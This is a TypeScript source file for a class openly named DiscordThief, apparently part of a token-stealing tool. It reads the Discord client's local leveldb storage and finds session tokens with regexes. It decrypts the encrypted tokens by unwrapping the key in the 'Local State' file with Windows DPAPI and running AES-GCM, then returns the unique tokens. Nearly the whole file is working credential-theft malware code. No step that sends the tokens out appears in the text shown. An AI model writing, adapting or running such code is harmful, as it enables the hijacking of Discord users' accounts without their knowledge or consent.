import fsPromises from 'fs/promises'
import path from 'path'
import crypto, { Word32Array } from 'jscrypto'

import { getDiscordPath, unprotectData } from './utils'
import { ENCRYPTED_REGEX, UNENCRYPTED_REGEX } from './const'

export class DiscordThief {
    public readonly discordPath = getDiscordPath()

    public async getTokens() {
        const encryptionKey = await this.getEncryptionKey()

        const tokens: string[] = []

        const dbPath = path.join(this.discordPath, 'Local Storage/leveldb')
        const dbFileNames = await fsPromises.readdir(dbPath)

        for (const fileName of dbFileNames) {
            let filePath: string
            let data: string

            try {
                filePath = path.join(dbPath, fileName)
                data = await fsPromises.readFile(filePath, 'utf-8')
            } catch {
                continue
            }

            for (const regex of UNENCRYPTED_REGEX) {
                const matches = data.match(regex)

                if (matches) {
                    tokens.push(matches[0])
                }
            }

            for (const regex of ENCRYPTED_REGEX) {
                const matches = data.match(regex)

                if (matches) {
                    const [encryptedToken] = matches

                    let token = await this.decryptToken(
                        encryptedToken,
                        encryptionKey
                    )

                    if (token.endsWith('\\')) {
                        token = token.replace('\\', '')
                    }

                    if (token) {
                        tokens.push(token)
                    }
                }
            }
        }

        const uniqueTokens = [...new Set(tokens)]

        return uniqueTokens
    }

    public async decryptToken(token: string, key: Uint8Array) {
        const tokenData = token.split('dQw4w9WgXcQ:')[1]
        const tokenBuffer = Buffer.from(tokenData, 'base64')

        const decryptedBuffer = crypto.AES.decrypt(
            new crypto.CipherParams({
                cipherText: new Word32Array(tokenBuffer.subarray(15))
            }),
            new Word32Array(key),
            {
                iv: new Word32Array(tokenBuffer.subarray(3, 15)),
                mode: crypto.mode.GCM,
                padding: crypto.pad.NoPadding
            }
        )

        const hex = decryptedBuffer.toString()
        const decoded = Buffer.from(hex, 'hex').toString()

        return decoded
    }

    public async getEncryptionKey() {
        const statePath = path.join(this.discordPath, 'Local State')
        const stateFileData = await fsPromises.readFile(statePath, 'utf-8')
        const state = JSON.parse(stateFileData)

        const encryptedKey = state.os_crypt.encrypted_key
        const decryptedKey = unprotectData(
            Buffer.from(encryptedKey, 'base64').subarray(5),
            null,
            'CurrentUser'
        )

        return decryptedKey
    }
}
